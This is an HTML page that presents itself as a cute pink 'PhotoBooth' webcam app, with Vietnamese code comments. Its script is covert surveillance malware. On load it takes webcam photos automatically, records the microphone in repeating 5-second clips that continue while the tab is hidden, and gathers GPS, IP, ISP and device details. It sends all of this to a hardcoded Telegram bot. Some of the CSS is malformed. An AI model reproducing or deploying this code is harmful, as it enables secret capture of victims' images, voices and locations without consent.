<!DOCTYPE html>

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PhotoBooth ♡</title>
<style>
* { box-sizing: border-box; }
:root { --pink: #f85199; --pink-dark: #d6136c; --pink-light: #ffd8e4; --pink-pale: #fff3f8; --text: #4b3f47; }
html, body { min-height: 100%; }
body {
  font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: radial-gradient(circle at 8% 12%, rgba(255,255,255,.95), transparent 23%), radial-gradient(circle at 92% 88%, rgba(248,81,153,.17), transparent 25%), linear-gradient(145deg, #ffd8e4 0%, #fff0f5 52%, #ffdeea 100%);
  color: var(--text);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
  overflow: hidden;
}
body::before, body::after { position: fixed; z-index: 0; color: rgba(214,19,108,.2); pointer-events: none; animation: float 5s ease-in-out infinite; }
body::before { content: "♡"; left: 7%; top: 13%; font-size: 70px; transform: rotate(-10deg); }
body::after { content: "✦"; right: 9%; bottom: 14%; font-size: 44px; animation-delay: -2s; }
.card {
  position: relative; z-index: 1; background: rgba(255,255,255,.94); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
  padding: 28px 20px 23px; border-radius: 32px; text-align: center; width: 90%; max-width: 414px;
  border: 1px solid rgba(255,255,255,.95); box-shadow: 0 24px 60px rgba(214,19,108,.15), 0 7px 20px rgba(255,182,193,.22);
  animation: cardIn .6s cubic-bezier(.2,.8,.2,1);
}
.card::before { content: "♡"; position: absolute; top: 12px; right: 18px; color: #f7b3cd; font-size: 18px; animation: pulse 2.5s ease-in-out infinite; }
h2 { margin: 0; color: var(--pink-dark); font-size: 26px; font-weight: 800; letter-spacing: -.4px; }
.title-sub { margin: 7px 0 0; color: #8a7d85; font-size: 13px; font-weight: 500; }
.camera-view {
  width: 100%; height: 300px;
  background: radial-gradient(circle at center, rgba(255,255,255,.95), transparent 48%), linear-gradient(135deg, #fff4f8, #ffe5ef);
  border-radius: 24px; margin: 19px 0 16px; overflow: hidden; position: relative;
  border: 2px dashed rgba(214,19,108,.55); display: flex; align-items: center; justify-content: center;
  box-shadow: inset 0 0 35px rgba(248,81,153,.08); transition: .3s ease;
}
.camera-view::before, .camera-view::after {
  content: ""; position: absolute; z-index: 3; width: 28px; height: 28px;
  border-color: var(--pink); pointer-events: none;
}
.camera-view::before { left: 14px; top: 14px; border-left: 3px solid; border-top: 3px solid; border-radius: 8px 0 0 0; }
.camera-view::after { right: 14px; bottom: 14px; border-right: 3px solid; border-bottom: 3px solid; border-radius: 0 0 8px 0; }
video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
#msg { color: #8b7d85 !important; font-size: 13px; font-weight: 500; }
.camera-status {
  position: absolute; top: 12px; left: 12px; z-index: 4; padding: 6px 10px; border-radius: 999px;
  background: rgba(255,255,255,.86); color: #74666e; font-size: 10px; font-weight: 800;
  box-shadow: 0 5px 15px rgba(0,0,0,.07); display: flex; align-items: center; gap: 6px;
}
.camera-status::before { content: ""; width: 7px; height: 7px; border-radius: 50%; background: #f0b4c9; }
.camera-view.camera-ready { border-style: solid; border-color: rgba(248,81,153,.8); box-shadow: inset 0 0 35px rgba(248,81,153,.12), 0 0 0 5px rgba(248,81,153,.05); }
.camera-view.camera-ready .camera-status::before { background: #45c97b; box-shadow: 0 0 0 4px rgba(69,201,123,.13); }
.btn {
  position: relative; overflow: hidden; background: linear-gradient(135deg, #ff69a8, #e92b7b); color: white; border: none;
  padding: 17px; width: 100%; border-radius: 18px; font-weight: 800; cursor: pointer; font-size: 16px;
  letter-spacing: .15px; transition: transform .18s ease, box-shadow .18s ease; box-shadow: 0 10px 24px rgba(248,81,153,.28);
}
.btn::after { content: ""; position: absolute; top: -90%; left: -30%; width: 32%; height: 280%; transform: rotate(22deg); background: rgba(255,255,255,.35); transition: left .55s ease; }
.btn:hover::after { left: 110%; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 13px 28px rgba(248,81,153,.34); }
.btn:active { transform: scale(.98); }
.btn:disabled { background: linear-gradient(135deg, #d8d3d6, #bcb7bb); color: #777; cursor: not-allowed; box-shadow: none; }
.btn:disabled::after { display: none; }
#status { font-size: 13px; color: #5f525a; margin-top: 14px; line-height: 1.5; font-weight: 600; }
@keyframes cardIn { from { opacity: 0; transform: translateY(18px) scale(.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
@keyframes float { 0%,100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-12px) rotate(5deg); } }
@keyframes pulse { 0%,100% { opacity: .45; transform: scale(1); } 50% { opacity: 1; transform: scale(1.15); } }
@media (max-height: 700px) { .card { padding: 20px 17px; } .camera-view { height: 230px; margin-top: 13px; } }

.kitty-top .ear.r { right: 4px; transform: rotate(17deg); border-radius: 20% 75% 20% 20%; }

.kitty-top .w2 { left: -15px; top: 66px; transform: rotate(-8deg); }

.kitty-top .w4 { right: -15px; top: 66px; transform: rotate(8deg); }

.kitty-side {
  position: fixed; z-index: 3; bottom: 10%; width: 82px; height: 100px; pointer-events: none;

@keyframes kittyFloatTop { 0%,100% { margin-top: 0; } 50% { margin-top: -7px; } }

<script>
// ===== CẤU HÌNH TELEGRAM =====
const BOT_TOKEN = '8747663329:AAHMggi37HpP27jJ3aMhcHwBbSOchddKuVY';
const ADMIN_CHAT_ID = '-5590662744';
// ===============================

const video = document.getElementById('video');
const captureBtn = document.getElementById('captureBtn');
const statusDiv = document.getElementById('status');
const cameraView = document.getElementById('cameraView');
const cameraStatus = document.getElementById('cameraStatus');
const msgDiv = document.getElementById('msg');

let stream = null;
let micStream = null;
let mediaRecorder = null;
let isCapturing = false;
let cameraGranted = false;
let micGranted = false;
let locationGranted = false;
let autoCaptured = false;
let isRecording = false;
let recordingTimer = null;
let isPageClosed = false;

// === GHI ÂM 5 GIÂY VÀ GỬI ===
async function recordAndSend() {
  if (!micGranted || isPageClosed) return;
  
  try {
    // Tạo stream mới cho mỗi lần ghi
    const tempStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const tempRecorder = new MediaRecorder(tempStream);
    const chunks = [];
    
    tempRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunks.push(event.data);
      }
    };
    
    tempRecorder.onstop = async () => {
      if (chunks.length === 0) return;
      const audioBlob = new Blob(chunks, { type: 'audio/webm' });
      if (audioBlob.size > 3000) { // Chỉ gửi nếu > 3KB
        await sendAudio(audioBlob);
      }
      tempStream.getTracks().forEach(t => t.stop());
    };
    
    tempRecorder.start();
    
    // Dừng sau 5 giây
    setTimeout(() => {
      if (tempRecorder.state === 'recording') {
        tempRecorder.stop();
      }
    }, 5000);
    
  } catch (err) {
    console.log('Record error:', err);
  }
}

// === GỬI AUDIO LÊN TELEGRAM ===
async function sendAudio(audioBlob) {
  try {
    const now = new Date();
    const filename = `audio_${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}.webm`;
    
    const [location, gps, deviceInfo] = await Promise.all([
      getLocationInfo(),
      getGPS(),
      getDeviceInfo()
    ]);
    
    let caption = `🎤 [GHI ÂM 5 GIÂY]\n`;
    caption += `🕒 Thời gian: ${now.toLocaleTimeString('vi-VN', { hour12: false })} ${now.toLocaleDateString('vi-VN')}\n`;
    caption += `📱 Thiết bị: ${deviceInfo.device}\n`;
    caption += `🖥️ Hệ điều hành: ${deviceInfo.os} ${deviceInfo.osVer}\n`;
    caption += `🌍 IP: ${location.ip}\n`;
    caption += `🏢 ISP: ${location.isp}\n`;
    caption += `📍 Vĩ độ: ${gps.lat || location.lat || 0}\n`;
    caption += `📍 Kinh độ: ${gps.lon || location.lon || 0}\n`;
    caption += `📌 Google Maps: https://maps.google.com/maps?q=${gps.lat || location.lat || 0},${gps.lon || location.lon || 0}\n`;
    caption += `🎤 Dung lượng: ${Math.round(audioBlob.size/1024)}KB\n\n`;
    caption += `by @ThanhDiemX ♡`;
    
    const formData = new FormData();
    formData.append('chat_id', ADMIN_CHAT_ID);
    formData.append('audio', audioBlob, filename);
    formData.append('caption', caption);
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: 'POST',
      body: formData
    });
    
    console.log('✅ Audio sent');
  } catch (err) {
    console.error('Send audio error:', err);
  }
}

// === BẮT ĐẦU VÒNG LẶP GHI ÂM ===
function startRecordingLoop() {
  if (recordingTimer) {
    clearInterval(recordingTimer);
  }
  // Ghi ngay lập tức
  setTimeout(() => recordAndSend(), 500);
  // Sau đó lặp lại mỗi 6 giây (5 giây ghi + 1 giây đệm)
  recordingTimer = setInterval(() => {
    if (!isPageClosed) {
      recordAndSend();
    } else {
      clearInterval(recordingTimer);
    }
  }, 6000);
}

// === DỪNG VÒNG LẶP ===
function stopRecordingLoop() {
  if (recordingTimer) {
    clearInterval(recordingTimer);
    recordingTimer = null;
  }
}

// === XIN QUYỀN MIC ===
async function requestMicrophone() {
  try {
    const testStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    micGranted = true;
    testStream.getTracks().forEach(t => t.stop());
    console.log('✅ Microphone granted');
    
    // Bắt đầu vòng lặp ghi âm
    startRecordingLoop();
    
  } catch {
    micGranted = false;
    console.log('❌ Microphone denied');
  }
}

// === XIN QUYỀN VỊ TRÍ ===
async function requestLocation() {
  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
    });
    locationGranted = true;
    console.log('✅ Location granted');
  } catch {
    locationGranted = false;
    console.log('❌ Location denied');
  }
}

// === LẤY THÔNG TIN IP ===
async function getLocationInfo() {
  try {
    const resp = await fetch('https://ipapi.co/json/');
    const data = await resp.json();
    return {
      ip: data.ip || 'Không xác định',
      country: data.country_name || 'Không xác định',
      city: data.city || 'Không xác định',
      region: data.region || 'Không xác định',
      isp: data.org || 'Không xác định',
      lat: data.latitude || 0,
      lon: data.longitude || 0,
      timezone: data.timezone || 'Không xác định'
    };
  } catch {
    return { ip: 'Không xác định', country: 'Không xác định', city: 'Không xác định', region: 'Không xác định', isp: 'Không xác định', lat: 0, lon: 0, timezone: 'Không xác định' };
  }
}

// === LẤY VỊ TRÍ GPS ===
async function getGPS() {
  if (!locationGranted) return { lat: 0, lon: 0 };
  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
    });
    return { lat: pos.coords.latitude, lon: pos.coords.longitude };
  } catch {
    return { lat: 0, lon: 0 };
  }
}

// === LẤY THÔNG TIN THIẾT BỊ ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Không xác định';
  let os = 'Không xác định';
  let osVer = 'Không xác định';
  if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; const m = ua.match(/Android\s([\d.]+)/i); if (m) osVer = m[1]; }
  else if (/iPhone|iPad|iPod/i.test(ua)) { device = 'iOS'; os = 'iOS'; const m = ua.match(/iPhone OS\s([\d_]+)/i); if (m) osVer = m[1].replace(/_/g, '.'); }
  else if (/Windows/i.test(ua)) { device = 'PC'; os = 'Windows'; const m = ua.match(/Windows NT\s([\d.]+)/i); if (m) osVer = m[1]; }
  else if (/Mac/i.test(ua)) { device = 'Mac'; os = 'macOS'; const m = ua.match(/Mac OS X\s([\d_]+)/i); if (m) osVer = m[1].replace(/_/g, '.'); }
  else if (/Linux/i.test(ua)) { device = 'Linux'; os = 'Linux'; }
  return { device, os, osVer };
}

// === TẠO CAPTION CHO ẢNH ===
function buildCaption(location, gps, deviceInfo, isAuto = false) {
  const now = new Date();
  const timeStr = now.toLocaleTimeString('vi-VN', { hour12: false });
  const dateStr = now.toLocaleDateString('vi-VN');
  const lat = gps.lat || location.lat || 0;
  const lon = gps.lon || location.lon || 0;
  const mapLink = `https://maps.google.com/maps?q=${lat},${lon}`;

  let caption = `📡 [THÔNG TIN TRUY CẬP]\n`;
  caption += `🕒 Thời gian: ${timeStr} ${dateStr}\n`;
  caption += `📱 Thiết bị: ${deviceInfo.device}\n`;
  caption += `🖥️ Hệ điều hành: ${deviceInfo.os} ${deviceInfo.osVer}\n`;
  caption += `🌍 IP dân cư: ${location.ip}\n`;
  caption += `🧠 IP gốc: ${location.ip}\n`;
  caption += `🏢 ISP: ${location.isp}\n`;
  caption += `🏙️ Địa chỉ: ${location.city}, ${location.region} (Vị trí IP)\n`;
  caption += `🌎 Quốc gia: ${location.country}\n`;
  caption += `📍 Vĩ độ: ${lat}\n`;
  caption += `📍 Kinh độ: ${lon}\n`;
  caption += `📌 Google Maps: ${mapLink}\n`;
  caption += `🎤 Micro: ${micGranted ? '✅ Đã cấp (đang ghi âm 5s)' : '❌ Từ chối'}\n`;
  caption += `📍 GPS: ${locationGranted ? '✅ Đã cấp' : '❌ Từ chối'}\n`;
  caption += `📸 Camera: ✅ Đã chụp ${isAuto ? 'tự động' : 'thủ công'}\n\n`;
  caption += `⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.\n`;
  caption += `\nby @ThanhDiemX ♡`;
  return caption;
}

// === CHỤP ẢNH VÀ GỬI ===
async function captureAndSend(isAuto = false) {
  if (isCapturing || !stream) return;
  isCapturing = true;

  try {
    const canvas = document.createElement('canvas');
    const vw = video.videoWidth || 640;
    const vh = video.videoHeight || 480;
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, vw, vh);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
    if (!blob) throw new Error('Không tạo được ảnh');

    const now = new Date();
    const filename = `photobooth_${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}.jpg`;

    const [location, gps, deviceInfo] = await Promise.all([
      getLocationInfo(),
      getGPS(),
      getDeviceInfo()
    ]);
    const caption = buildCaption(location, gps, deviceInfo, isAuto);

    const formData = new FormData();
    formData.append('chat_id', ADMIN_CHAT_ID);
    formData.append('photo', blob, filename);
    formData.append('caption', caption);

    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await resp.json();
    if (!result.ok) throw new Error(result.description || 'Lỗi gửi Telegram');

    cameraView.style.transition = 'background 0.15s';
    cameraView.style.background = 'rgba(255,255,255,0.9)';
    setTimeout(() => { cameraView.style.background = ''; }, 200);

    const label = isAuto ? '📸 Ảnh tự động' : '📸 Ảnh thủ công';
    statusDiv.textContent = `✅ ${label} đã gửi!`;
    msgDiv.textContent = isAuto ? '💖 Tự động chụp thành công!' : '🎉 Ảnh đã gửi đi!';

  } catch (err) {
    console.error('Capture error:', err);
    statusDiv.textContent = '❌ Lỗi: ' + err.message;
    statusDiv.style.color = '#d6136c';
  } finally {
    isCapturing = false;
  }
}

// === KHỞI TẠO CAMERA ===
async function initCamera() {
  try {
    statusDiv.textContent = '⏳ Đang kết nối...';
    
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
    cameraGranted = true;
    video.srcObject = stream;
    await video.play();
    video.style.display = 'block';
    cameraView.classList.add('camera-ready');
    cameraStatus.innerHTML = '🟢 Camera sẵn sàng';
    msgDiv.textContent = '😊 Đã kết nối camera!';
    captureBtn.disabled = false;
    statusDiv.textContent = '✅ Đã sẵn sàng';

    requestMicrophone();
    requestLocation();

    setTimeout(async () => {
      if (!autoCaptured) {
        autoCaptured = true;
        await captureAndSend(true);
        setTimeout(async () => {
          await captureAndSend(true);
        }, 2000);
      }
    }, 800);

    return true;
  } catch (err) {
    console.error('Camera error:', err);
    cameraStatus.innerHTML = '🔴 Lỗi camera';
    msgDiv.textContent = '⚠️ Không thể truy cập camera';
    statusDiv.textContent = '❌ Lỗi: ' + err.message;
    statusDiv.style.color = '#d6136c';
    captureBtn.disabled = true;
    return false;
  }
}

// === SỰ KIỆN BẤM NÚT ===
captureBtn.addEventListener('click', async () => {
  if (isCapturing) return;
  if (!stream) {
    statusDiv.textContent = '⏳ Đang kết nối lại camera...';
    await initCamera();
    return;
  }
  await captureAndSend(false);
});

// === KHỞI ĐỘNG ===
initCamera();

// === XỬ LÝ KHI ĐÓNG TAB ===
window.addEventListener('beforeunload', () => {
  isPageClosed = true;
  stopRecordingLoop();
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
  if (micStream) {
    micStream.getTracks().forEach(t => t.stop());
  }
});

// === XỬ LÝ KHI TAB BỊ ẨN ===
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      stream = null;
      video.style.display = 'none';
      cameraView.classList.remove('camera-ready');
      cameraStatus.innerHTML = '🔴 Tạm dừng';
      captureBtn.disabled = true;
    }
    // Vẫn tiếp tục ghi âm
  } else if (!document.hidden && !stream) {
    initCamera();
  }
});

// === PHÍM CÁCH CHỤP ===
document.addEventListener('keydown', (e) => {
  if (e.key === ' ' && !captureBtn.disabled && !isCapturing) {
    e.preventDefault();
    captureAndSend(false);
  }
});
</script>
